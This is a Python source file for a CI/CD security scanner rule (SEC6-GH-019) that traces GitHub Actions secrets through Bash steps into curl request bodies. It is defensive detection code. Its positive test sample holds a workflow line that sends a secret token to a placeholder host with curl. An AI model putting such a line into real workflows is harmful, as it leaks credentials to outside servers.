"""Bounded, source-owned secret data flow to a curl HTTP request body."""

from __future__ import annotations

import tempfile
from dataclasses import dataclass
from pathlib import Path

from taintly.models import IncompletePatternMatches, Platform, Rule, Severity
from taintly.parsers.structural import EventKind, walk_workflow
from taintly.parsers.structural.tokenizer import TokenKind, tokenize
from taintly.rules._secret_network_shell import (
    _ASSIGN,
    _BASE64,
    _BODY_CANDIDATE,
    _ECHO,
    _SECRET,
    _curl_body,
    _expanded,
    _Flow,
    _joined,
    _physical_source,
)
from taintly.rules.github.secret_artifact_flow import (
    _effective_shell,
    _effective_working_directory,
    _env_fields,
    _event_map,
    _layered_env,
    _single,
)


@dataclass(frozen=True)
class _OccurrenceNotes:
    notes: tuple[str, ...]


def _secret_bindings(fields, leaves, job: str, step: int) -> dict[str, _Flow]:
    bindings: dict[str, _Flow] = {}
    for name, value in _layered_env(fields, job, step).items():
        match = _SECRET.fullmatch(value.strip())
        if match:
            for scope in (("jobs", job, "steps", step), ("jobs", job), ()):
                event = _single(leaves, (*scope, "env", name))
                if event is not None:
                    bindings[name] = _Flow(
                        frozenset({match.group(1)}), ((event.line, "secret-env-binding"),)
                    )
                    break
    return bindings


def _owner_supported(keys, leaves, tokens, job: str, step: int) -> bool:
    """Admit only a directly owned Bash run on a known hosted Ubuntu runner."""
    runner = _single(leaves, ("jobs", job, "runs-on"))
    if runner is None or runner.value not in {"ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04"}:
        return False
    if _effective_shell(keys, leaves, tokens, job, step, container=False) != "bash":
        return False
    if _effective_working_directory(keys, leaves, tokens, job, step) != ".":
        return False
    owner = ("jobs", job)
    step_owner = (*owner, "steps", step)
    all_paths = (*keys.keys(), *leaves.keys())
    if any(path[:4] == (*owner, "strategy", "matrix") for path in all_paths):
        return False
    if any(path[:3] == (*owner, "container") for path in all_paths):
        return False
    if any(path == (*step_owner, "uses") for path in all_paths):
        return False
    for guard in ((*owner, "if"), (*step_owner, "if")):
        event = _single(leaves, guard)
        if event is not None and (event.value or "").strip().lower() == "false":
            return False
    return True


def _run_lines(event, source_lines: list[str]) -> tuple[tuple[int, str], ...] | None:
    if event.value_kind != "block_literal" or not event.block_lines or len(event.block_lines) > 60:
        return None
    for number, raw in event.block_lines:
        if number < 1 or number > len(source_lines):
            return None
        # Structural parser returns the block value after indentation removal.
        # It must still correspond to the physical line, not an alias replay.
        if not source_lines[number - 1].rstrip().endswith(raw.rstrip()):
            return None
    if "\n".join(raw for _, raw in event.block_lines).rstrip("\n") != (event.value or "").rstrip(
        "\n"
    ):
        return None
    return tuple(event.block_lines)


class SecretNetworkFlowPattern:
    def check(self, content: str, _lines: list[str]) -> list[tuple[int, str]]:
        if _BODY_CANDIDATE.search(content) and "secrets." in content:
            return IncompletePatternMatches(
                [], reason="SEC6-GH-019 physical workflow source is required"
            )
        return []

    def self_test_check(self, sample: str):
        """Run authored samples with the physical identity production requires."""
        with tempfile.TemporaryDirectory() as root:
            path = Path(root) / ".github" / "workflows" / "sample.yml"
            path.parent.mkdir(parents=True)
            path.write_text(sample, encoding="utf8")
            return self.check_with_filepath(sample, sample.splitlines(), str(path))

    def self_test_mutation_applicable(self, source: str, mutant: str, operator: str) -> bool:
        """A zero-space YAML rewrite is not equivalent if it erases ``run``."""
        if operator != "whitespace_pad":
            return True

        def run_owners(content: str) -> set[tuple[object, ...]] | None:
            result: set[tuple[object, ...]] = set()
            for event in walk_workflow("workflow.yml", content=content, include_keys=True):
                if event.kind in {EventKind.ERROR, EventKind.CUTOFF} or event.merge_origins:
                    return None
                path = event.path
                if (
                    event.kind is EventKind.LEAF_SCALAR
                    and len(path) == 5
                    and path[0] == "jobs"
                    and isinstance(path[1], str)
                    and path[2] == "steps"
                    and isinstance(path[3], int)
                    and path[4] == "run"
                ):
                    result.add(path)
            return result

        before, after = run_owners(source), run_owners(mutant)
        return before is None or after is None or not bool(before - after)

    def _analyze(self, content: str, filepath: str):
        candidate = bool(_BODY_CANDIDATE.search(content) and "secrets." in content)
        if not candidate:
            return [], {}, None
        digest = _physical_source(filepath, content)
        if digest is None:
            return [], {}, "SEC6-GH-019 source identity is unavailable"
        events = tuple(walk_workflow(filepath, content=content, include_keys=True, recover=True))
        keys, leaves = _event_map(events)
        try:
            tokens = tuple(tokenize(content))
        except Exception:
            return [], {}, "SEC6-GH-019 candidate YAML tokens are incomplete"
        if candidate and (
            any(event.kind in {EventKind.CUTOFF, EventKind.ERROR} for event in events)
            or any(len(group) != 1 for group in (*keys.values(), *leaves.values()))
            or any(
                token.kind in {TokenKind.MERGE_KEY, TokenKind.ALIAS, TokenKind.ANCHOR}
                for token in tokens
            )
        ):
            return [], {}, "SEC6-GH-019 candidate structure or owner is ambiguous"
        fields, ambiguous, invalid_owners, invalid_values, unknown_owners = _env_fields(
            keys, leaves, tokens
        )
        if candidate and ambiguous:
            return [], {}, "SEC6-GH-019 candidate environment owner is ambiguous"
        runs = sorted(
            (
                (path, group[0])
                for path, group in leaves.items()
                if len(path) == 5
                and path[0] == "jobs"
                and path[2] == "steps"
                and type(path[3]) is int
                and path[4] == "run"
                and len(group) == 1
            ),
            key=lambda pair: (str(pair[0][1]), pair[0][3]),
        )
        if len(runs) > 64:
            return [], {}, "SEC6-GH-019 run-step budget exceeded" if candidate else None
        matches: list[tuple[int, str]] = []
        notes: dict[tuple[int, str], str] = {}
        incomplete = False
        job_files: dict[str, dict[str, _Flow]] = {}
        prior_step: dict[str, int] = {}
        source_lines = content.splitlines()
        for path, event in runs:
            job, step = str(path[1]), path[3]
            if step != prior_step.get(job, -1) + 1:
                job_files[job] = {}
            prior_step[job] = step
            files = job_files.setdefault(job, {})
            step_owner = ("jobs", job, "steps", step)
            guarded = (*step_owner, "if") in leaves or (*step_owner, "if") in keys
            if guarded:
                files.clear()
            owners = ((), ("jobs", job), step_owner)
            if (
                any(owner in invalid_owners or owner in unknown_owners for owner in owners)
                or any(owner in owners for owner, _ in invalid_values)
                or not _owner_supported(keys, leaves, tokens, job, step)
            ):
                incomplete |= (
                    bool(_BODY_CANDIDATE.search(event.value or "")) and "secrets." in content
                )
                files.clear()
                continue
            values = _secret_bindings(fields, leaves, job, step)
            rows = _run_lines(event, source_lines)
            if rows is None:
                incomplete |= bool(values or files) and bool(
                    _BODY_CANDIDATE.search(event.value or "")
                )
                files.clear()
                continue
            for index, (line_number, raw) in enumerate(rows):
                command = raw.strip()
                if not command or command.startswith("#"):
                    continue
                if match := _ASSIGN.fullmatch(command):
                    flow = _expanded(match.group(2), values, line_number, "shell-assignment")
                    if flow is None:
                        incomplete |= bool(values or files) and any(
                            _BODY_CANDIDATE.search(row) for _, row in rows[index:]
                        )
                        files.clear()
                        break
                    values[match.group(1)] = flow
                    continue
                if match := _ECHO.fullmatch(command):
                    flow = _expanded(match.group(1), values, line_number, "file-write")
                    if flow is None:
                        incomplete |= bool(values or files) and any(
                            _BODY_CANDIDATE.search(row) for _, row in rows[index:]
                        )
                        files.clear()
                        break
                    filename = match.group(3)
                    files[filename] = (
                        flow
                        if match.group(2) == ">" or filename not in files
                        else _joined([files[filename], flow], line_number, "file-append")
                    )
                    continue
                if match := _BASE64.fullmatch(command):
                    prior = files.get(match.group(1))
                    if prior is None:
                        incomplete |= bool(values or files) and any(
                            _BODY_CANDIDATE.search(row) for _, row in rows[index:]
                        )
                        files.clear()
                        break
                    files[match.group(2)] = _joined([prior], line_number, "base64-file-transform")
                    continue
                if command.startswith("curl "):
                    flow = _curl_body(command, values, files, line_number)
                    if flow is not None:
                        if flow.secrets:
                            item = (line_number, raw.strip())
                            matches.append(item)
                            hops = " -> ".join(
                                f"{kind} line {number}" for number, kind in flow.hops
                            )
                            notes[item] = (
                                f"Source SHA256 {digest}; job {job}, step {step}; configured secret {', '.join(sorted(flow.secrets))} reaches curl body via {hops}. Destination trust, execution, secret availability and delivery are unknown."
                            )
                        continue
                    incomplete |= bool(values or files) and bool(_BODY_CANDIDATE.search(command))
                    files.clear()
                    break
                incomplete |= bool(values or files) and any(
                    _BODY_CANDIDATE.search(row) for _, row in rows[index:]
                )
                files.clear()
                break
            if guarded:
                files.clear()
        return (
            matches,
            notes,
            "SEC6-GH-019 candidate path stopped at unsupported source or Bash operation"
            if incomplete
            else None,
        )

    def check_with_filepath(self, content: str, _lines: list[str], filepath: str):
        matches, _notes, incomplete = self._analyze(content, filepath)
        return IncompletePatternMatches(matches, reason=incomplete) if incomplete else matches

    def context_notes_for_matches(
        self, content: str, filepath: str, matches: list[tuple[int, str]]
    ) -> list[_OccurrenceNotes | None]:
        _matches, notes, _incomplete = self._analyze(content, filepath)
        return [_OccurrenceNotes((notes[item],)) if item in notes else None for item in matches]


_SAMPLE = (
    "name: sample\non: workflow_dispatch\njobs:\n"
    "  check:\n    runs-on: ubuntu-latest\n    steps:\n"
    "      - env:\n          TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n"
    "        run: |\n"
    "          curl https://example.test/collect --data $TOKEN\n"
)


RULES = [
    Rule(
        id="SEC6-GH-019",
        title="Secret-derived data may reach an outbound HTTP request body",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-6",
        description="A configured secret-backed value reaches a curl request body through a bounded Bash dataflow. Destination trust, execution, availability and delivery are unknown.",
        pattern=SecretNetworkFlowPattern(),
        remediation="Keep secrets out of general request bodies and uploaded files. If the endpoint legitimately requires this payload, review its trust and retention. Otherwise remove the transfer; review the affected run and rotate exposed credentials if delivery is confirmed.",
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions",
        test_positive=[_SAMPLE],
        test_negative=[_SAMPLE.replace("--data $TOKEN", "--data status=ready")],
        finding_family="credential_exposure",
        confidence="medium",
        review_needed=True,
    )
]
